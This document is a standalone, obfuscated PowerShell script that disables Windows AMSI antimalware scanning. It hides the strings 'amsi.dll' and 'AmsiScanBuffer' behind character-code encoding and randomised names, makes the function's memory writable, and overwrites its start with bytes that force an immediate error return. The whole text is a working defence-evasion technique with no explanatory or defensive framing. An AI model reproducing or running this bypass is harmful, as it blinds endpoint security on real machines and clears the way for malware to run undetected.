$KTJpjoUNhP4dhdQ = @"
using System;
using System.Runtime.InteropServices;
public class KTJpjoUNhP4dhdQ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ZKJjOx_tSdWc, string B8Wxado1n);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr u9VepOzlqm, UIntPtr WeUmBckZfv74, uint Wv9N, out uint xpR);
}
"@

Add-Type $KTJpjoUNhP4dhdQ

$oGTc2OCrL = [KTJpjoUNhP4dhdQ]::LoadLibrary("$([CHAr]([Byte]0x61)+[ChAr]([BytE]0x6d)+[CHar]([BYte]0x73)+[CHAR]([byTE]0x69)+[cHaR]([ByTe]0x2e)+[chAr]([bYTe]0x64)+[char]([byTE]0x6c)+[cHAr]([ByTe]0x6c))")
$jsFqALpY = [KTJpjoUNhP4dhdQ]::GetProcAddress($oGTc2OCrL, "$(('Ãmsì'+'Scän'+'Bûff'+'êr').NORmALIZE([chAR]([BYtE]0x46)+[chAR](111+1-1)+[cHAR]([bYTe]0x72)+[CHAr](109)+[ChAR](57+11)) -replace [chAr]([BYTE]0x5c)+[ChAR]([BYTe]0x70)+[CHar]([bYTE]0x7b)+[ChAR](77)+[cHaR](59+51)+[Char](125+87-87))")
$p = 0
[KTJpjoUNhP4dhdQ]::VirtualProtect($jsFqALpY, [uint32]5, 0x40, [ref]$p)
$bljx = "0xB8"
$GmrUOyTgdks = "0x57"
$RyRzvDxho4ha06k2Ci = "0x00"
$fXE76FkofiXXJHf27VW = "0x07"
$Fk8rUkiwvwAmNl = "0x80"
$ivLtvxqE = "0xC3"
$hSzdROEPlA = [Byte[]] ($bljx,$GmrUOyTgdks,$RyRzvDxho4ha06k2Ci,$fXE76FkofiXXJHf27VW,+$Fk8rUkiwvwAmNl,+$ivLtvxqE)
[System.Runtime.InteropServices.Marshal]::Copy($hSzdROEPlA, 0, $jsFqALpY, 6)